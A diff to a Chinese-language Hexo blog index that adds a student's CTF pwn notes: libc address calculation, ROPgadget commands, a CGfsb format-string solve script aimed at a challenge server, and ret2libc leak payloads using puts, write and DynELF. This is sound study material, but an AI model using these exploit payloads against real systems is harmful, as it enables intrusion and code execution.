@@ -145,6 +145,373 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/15/%E5%85%B3%E4%BA%8Elibc%E7%9A%84%E4%B8%A4%E7%A7%8D%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/04/15/%E5%85%B3%E4%BA%8Elibc%E7%9A%84%E4%B8%A4%E7%A7%8D%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-15 21:50:25" itemprop="dateCreated datePublished" datetime="2024-04-15T21:50:25+08:00">2024-04-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-06-21 19:41:35" itemprop="dateModified" datetime="2024-06-21T19:41:35+08:00">2024-06-21</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>First</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">libcbase=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libcbase+ libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">shell_addr=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;bin/sh&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>Second</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在ida中不用这些看地址。</p>
+<p>首先是read_got。可以在IDA中通过按ctrl+s跳转到不同的段。先看got表，也就是对应的.got.plt（而非.got）</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/12/c%E8%AF%AD%E8%A8%80%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E5%88%A4%E6%96%AD/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/04/12/c%E8%AF%AD%E8%A8%80%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E5%88%A4%E6%96%AD/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-12 21:38:14" itemprop="dateCreated datePublished" datetime="2024-04-12T21:38:14+08:00">2024-04-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-04-26 21:08:24" itemprop="dateModified" datetime="2024-04-26T21:08:24+08:00">2024-04-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="基址寻找方式"><a href="#基址寻找方式" class="headerlink" title="基址寻找方式"></a>基址寻找方式</h4><p>rdi：可通过使用ROPgadget工具进行查找，可得地址为 0x400c83</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget  --binary <span class="string">&#x27;filename&#x27;</span> |grep <span class="string">&quot;pop rdi&quot;</span>  <span class="comment"># filename填自己的文件名</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>ljust()方法语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str.ljust(width[, fillchar])</span><br></pre></td></tr></table></figure>
+
+<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul>
+<li>width – 指定字符串长度。</li>
+<li>fillchar – 填充字符，默认为空格。</li>
+</ul>
+<h3 id="strlen函数"><a href="#strlen函数" class="headerlink" title="strlen函数"></a>strlen函数</h3><blockquote>
+<p>​										strlen函数：计算的是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>str的长度，从字符的首地址开始遍历，以 ‘\0’ 为结束标志，然后将计算的长度返回，计算的长度并不包含’\0’。</p>
+</blockquote>
+<p>​												则有且仅有仅输入\0可防止输入的payload被改变</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%83%A8%E5%88%86%E4%BE%8B%E9%A2%98%E6%AD%A5%E9%AA%A4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%83%A8%E5%88%86%E4%BE%8B%E9%A2%98%E6%AD%A5%E9%AA%A4/" class="post-title-link" itemprop="url">做题步骤二</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-26 16:34:33 / 修改时间：17:36:51" itemprop="dateCreated datePublished" datetime="2024-03-26T16:34:33+08:00">2024-03-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​                                                                                    <em><strong>攻防世界CGfsb</strong></em></p>
+<p>下载附件在vm中打开，checksec指令获得其设置的保护措施</p>
+<p><img src="https://ooo.0x0.ooo/2024/03/26/OgdNlN.png"></p>
+<p>由pwntools可知此开启了Canary，但未有pie操作禁止</p>
+<p>拖入ida32位打开后F5反编译得</p>
+<p><img src="https://ooo.0x0.ooo/2024/03/26/OgdF7B.png"></p>
+<p>分析可得可利用跳转操作使pwnme值&#x3D;8</p>
+<p><img src="https://ooo.0x0.ooo/2024/03/26/OgdrBC.png"></p>
+<p>利用%n的属性进行pwnme的赋值</p>
+<p>可尝试交互判断其偏移位置<img src="https://ooo.0x0.ooo/2024/03/26/OgdAZL.png"></p>
+<p>A的ASCII值为41，由此可判断输入并存储的数据AAAA应在栈中偏移值为10的地址</p>
+<p>可得代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">49339</span>);</span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please&quot;</span>)</span><br><span class="line">payload =p32(<span class="number">0x0804A068</span>)+<span class="string">b&quot;aaaa%10$n&quot;</span>;<span class="comment">#b统一形式转字符</span></span><br><span class="line">p.sendline(payload);</span><br><span class="line"></span><br><span class="line">p.interactive();</span><br></pre></td></tr></table></figure>
+
+<p>vm运行即得flag。</p>
+<p><img src="https://ooo.0x0.ooo/2024/03/26/OgdgLx.png"></p>
+<hr>
+<ol>
+<li>**p32(0x0804a068)是pwnme的地址;**（ida中双击pwnme即得）</li>
+<li>**”aaaa%10$n”:**这里四个a的作用是填充字符数，因为p32函数将pwnme地址转化成四个字节的小端序字符，我们希望写入pwnme的数字是8，因此再填充4个任意字符这样下来%之前共有八个字符了。</li>
+<li><strong>举个其他的例子🌰</strong>: %85c%7$n——将85写入栈内第7个参数所指向的地址。</li>
+<li><strong>$ 是偏移符号</strong>：前面贴着偏移量，而后紧跟n。</li>
+<li><strong>%n</strong> ：打印到目前为止所写的字符数</li>
+<li>总的来说payload代表意为将第二段%之前输入的字符数载入到<strong>栈中偏移十位的变量中</strong>（导入了地址所以转移到了pwnme中）。</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/22/ret2libc%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/22/ret2libc%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">经验总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-22 20:03:57" itemprop="dateCreated datePublished" datetime="2024-03-22T20:03:57+08:00">2024-03-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-03-31 21:36:09" itemprop="dateModified" datetime="2024-03-31T21:36:09+08:00">2024-03-31</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>read函数（这里字符串只有0x80字节，而read需要从字符串中读取字节数远大于字符串），存在溢出条件。</p>
+<p>点开shift+F12进入筛选字符串界面点击后即可进入汇编地址目录，寻找汇编操作的地址作为返回地址。</p>
+<hr>
+<p>后门类型：libc，system，bin&#x2F;sh，cat flag。</p>
+<p>libc：</p>
+<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p>
+<p>做题要找对应函数在got中的地址</p>
+<p><img src="https://ooo.0x0.ooo/2024/03/22/Ogv3Ab.png"></p>
+<p>32位和64位的区别</p>
+<p><img src="https://ooo.0x0.ooo/2024/03/22/OgvCQl.jpg"></p>
+<p><img src="https://ooo.0x0.ooo/2024/03/22/OgvE2p.png"></p>
+<p>libc相关工具使用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)    </span><br></pre></td></tr></table></figure>
+
+<p>如果遇到返回多个<em><strong>libc</strong></em>版本库的情况，可以通过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_condition(leaked_func, leaked_address)</span><br></pre></td></tr></table></figure>
+
+<p>来添加限制条件，也可以手工选择其中一个<em><strong>libc</strong></em>版本（如果你确定的话）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)   <span class="comment">#首位填‘\0’,绕过加密，之后填上a覆盖到返回地址</span></span><br><span class="line">以上为因本题目所需写出的特殊语句</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)   <span class="comment">#设置rdi寄存器的值为puts的got表地址</span></span><br><span class="line">payload+=p64(puts_plt)   <span class="comment">#调用puts函数，输出的是puts的got表地址</span></span><br><span class="line">payload+=p64(main)       <span class="comment">#设置返回地址，上述步骤完成了输出了puts函数的地址，我们得控制程序执行流</span></span><br><span class="line">                         <span class="comment">#让它返回到main函数，这样我们才可以再一次利用输入点构造rop </span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))<span class="comment">#接收程序返回的地址</span></span><br><span class="line">                                                   <span class="comment">#lijust（8，‘\0’）,不满8位的用0补足</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)  <span class="comment">#利用LibcSearcher模块找到匹配的libc版本                   </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>strlen函数遇到‘\0’就会停止。x为无符号整型大于等于0（unsigned int）</p>
+<hr>
+<p>偏移地址：libc是Linux新系统下的C函数库，其中就会有system()函数、”&#x2F;bin&#x2F;sh”字符串，而libc库中存放的就是这些函数的偏移地址。换句话说，只要确定了libc库的版本，就可以确定其中system()函数、”&#x2F;bin&#x2F;sh”字符串的偏移地址。解题核心在于如何确定libc版本。</p>
+<p>基地址：每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。然而，哪怕每次运行时函数的真实地址一直在变，最后三位确始终相同。可以根据这最后三位是什么确定这个函数的偏移地址，从而反向推断出libc的版本（此处需要用到工具LibcSearcher库，本文忽略这个步骤）。那么如何求基地址呢？如果我们可以知道一个函数的真实地址，用公式：</p>
+<p>这次运行程序的基地址 &#x3D; 这次运行得到的某个函数func的真实地址  - 函数func的偏移地址</p>
+<p>即可求出这次运行的基地址。 </p>
+<hr>
+<p>如何找到某个函数func的真实地址呢？</p>
+<p>像puts(),write()这样的函数可以打印内容，我们可以直接利用这些打印函数，打印出某个函数的真实地址（即got表中存放的地址）。某个函数又指哪个函数呢？由于Linux的延迟绑定机制，我们必须选择一个main函数中已经执行过的函数（这样才能保证该函数在got表的地址可以被找到），选哪个都可以，当然也可以直接选puts和write，毕竟题目中像puts和write往往会直接出现在main函数中。</p>
+<p>总结一下上面这段话，我们可以通过构造payload让程序执行puts(puts@got)或者write(1,write@got, 读取的字节数)打印puts函数&#x2F;write函数的真实地址。</p>
+<hr>
+<p><code>p32()</code> 可以让我们转换整数到小端序格式. <code>p32</code> 转换4字节. <code>p64</code> 和 <code>p16</code> 则分别转换 8 bit 和 2 bit 数字.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%d <span class="comment">// 十进制 - 输出十进制整数</span></span><br><span class="line">%s <span class="comment">// 字符串 - 从内存中读取字符串</span></span><br><span class="line">%x <span class="comment">//十六进制 - 输出十六进制数</span></span><br><span class="line">%c <span class="comment">// 字符 - 输出字符</span></span><br><span class="line">%p <span class="comment">// 指针 - 指针地址</span></span><br><span class="line">%n <span class="comment">// 到目前为止所写的字符数</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atoi()</span><br></pre></td></tr></table></figure>
+
+<p>函数会扫描参数 str 字符串，跳过前面的空白字符（例如空格，tab缩进等），直到遇上数字或正负符号才开始做转换，而再遇到 非数字 或 字符串结束时(’\0’) 才结束转换，并将结果返回。函数返回转换后的整型数；如果 str 不能转换成 int 或者 str 为空字符串，那么将返回 0。</p>
+<hr>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;xxxxx&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>更类似于接收到<em><strong>xxxxx</strong></em>的消息再进行下一操作，便于两步输入的分割。</p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd,<span class="type">void</span>*buf,<span class="type">size_t</span> count)</span></span><br></pre></td></tr></table></figure>
+
+<p>参数说明：<br>fd:      是文件描述符<br>buf:     为读出数据的缓冲区；<br>count:   为每次读取的字节数（是请求读取的字节数，读上来的数据保<br>         存在缓冲区buf中，同时文件的当前读写位置向后移）</p>
+<hr>
+<h3 id="使用Write-泄露函数实际地址"><a href="#使用Write-泄露函数实际地址" class="headerlink" title="使用Write()泄露函数实际地址"></a>使用Write()泄露函数实际地址</h3><p>头文件： <strong>#include &lt;unistd.h&gt;</strong></p>
+<p>定义函数：<strong>ssize_t write (int fd, const void * buf, size_t count);</strong></p>
+<p>函数说明：write()会把参数buf 所指的内存写入count 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.write函数的特点在于其输出完全由其参数size决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。</p>
+<p>第一个参数fd&#x3D;１：标准输出 STDOUT<br>返回值：如果顺利write()会返回实际写入的字节数. 当有错误发生时则返回-1, 错误代码存入errno 中.</p>
+<p><strong>Payload</strong>：‘a’ * 栈大小 + ebp + write_plt_addr + write执行后的返回地址 + fd + 要泄露的地址 + count</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./elf_file&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x88</span>			 <span class="comment"># 栈的大小</span></span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span> 			 <span class="comment"># ebp</span></span><br><span class="line">    payload += p32(write_plt)    <span class="comment"># write地址</span></span><br><span class="line">    payload += p32(main_addr)    <span class="comment"># 返回地址</span></span><br><span class="line">    payload += p32(<span class="number">1</span>)       <span class="comment"># 第一个参数 fd</span></span><br><span class="line">    payload += p32(addr)    <span class="comment"># 第二个参数 buf   通常可以为write_got</span></span><br><span class="line">    payload += p32(<span class="number">4</span>)       <span class="comment"># 第三个参数 size</span></span><br><span class="line">    conn.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>,payload)</span><br><span class="line">    content = conn.recv()[:<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%#x -&gt; %s&quot;</span> %(addr, binascii.b2a_hex((content <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>))))</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;__libc_system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用Puts-泄露函数实际地址"><a href="#使用Puts-泄露函数实际地址" class="headerlink" title="使用Puts()泄露函数实际地址"></a>使用Puts()泄露函数实际地址</h3><p>头文件： <strong>#include&lt;stdio.h&gt;</strong></p>
+<p>定义函数：*<em>int puts(const char <em>string);</em></em></p>
+<p>函数说明： **puts()**函数只能够输出字符串，以’\0’来确定字符串的结尾。</p>
+<p><strong>Payload</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * 0X 			<span class="comment"># 栈的大小</span></span><br><span class="line">payload += p64(<span class="number">0</span>) 	  			<span class="comment"># ebp</span></span><br><span class="line">payload += p64(pop_rdi)			<span class="comment"># 给puts()函数赋值</span></span><br><span class="line">payload += p64(addr)				<span class="comment"># leak函数的参数addr  可以为puts_got</span></span><br><span class="line">payload += p64(puts_plt)		<span class="comment"># puts函数地址</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>gadget:</p>
+<p>安装了pwntools后，执行如下命令即可（此处以攻防世界的”pwn-100”为例）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./pwn-<span class="number">100</span> --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/17/%E6%A0%88%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -716,241 +1083,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/13/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/03/13/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4-1/" class="post-title-link" itemprop="url">汇编指令</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-03-13 19:02:23" itemprop="dateCreated datePublished" datetime="2024-03-13T19:02:23+08:00">2024-03-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-03-18 21:52:36" itemprop="dateModified" datetime="2024-03-18T21:52:36+08:00">2024-03-18</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令***"></a>汇编指令***</h1><h3 id="一·-通用数据传送指令。"><a href="#一·-通用数据传送指令。" class="headerlink" title="一· 通用数据传送指令。"></a>一· 通用数据传送指令。</h3><h3 id="1。基本指令"><a href="#1。基本指令" class="headerlink" title="1。基本指令"></a><strong>1。基本指令</strong></h3><p><em><strong>MOV</strong></em> 传送字或字节。<br><em><strong>MOVSX</strong></em> 先符号扩展，再传送。<br><em><strong>MOVZX</strong></em> 先零扩展，再传送。<br><em><strong>PUSH</strong></em> 把字压入堆栈。<br><em><strong>POP</strong></em> 把字弹出堆栈。<br><em><strong>PUSHA</strong></em> 把AX，CX，DX，BX，SP，BP，SI，DI依次压入堆栈。<br><em><strong>POPA</strong></em> 把DI，SI，BP，SP，BX，DX，CX，AX依次弹出堆栈。<br><em><strong>PUSHAD</strong></em> 把EAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI依次压入堆栈。<br><em><strong>POPAD</strong></em> 把EDI，ESI，EBP，ESP，EBX，EDX，ECX，EAX依次弹出堆栈。<br><em><strong>BSWAP</strong></em> 交换32位寄存器里字节的顺序<br><em><strong>XCHG</strong></em> 交换字或字节。( 至少有一个操作数为寄存器，段寄存器不可作为操作数)<br><em><strong>CMPXCHG</strong></em> 比较并交换操作数。( 第二个操作数必须为累加器AL&#x2F;AX&#x2F;EAX )<br><em><strong>XADD</strong></em> 先交换再累加。( 结果在第一个操作数里 )<br><em><strong>XLAT</strong></em> 字节查表转换。<br><em><strong>── BX</strong></em> 指向一张 256 字节的表的起点， AL 为表的索引值 (0-255，即0-FFH); 返回 AL 为查表结果。 ( [BX+AL]-&gt;AL )</p>
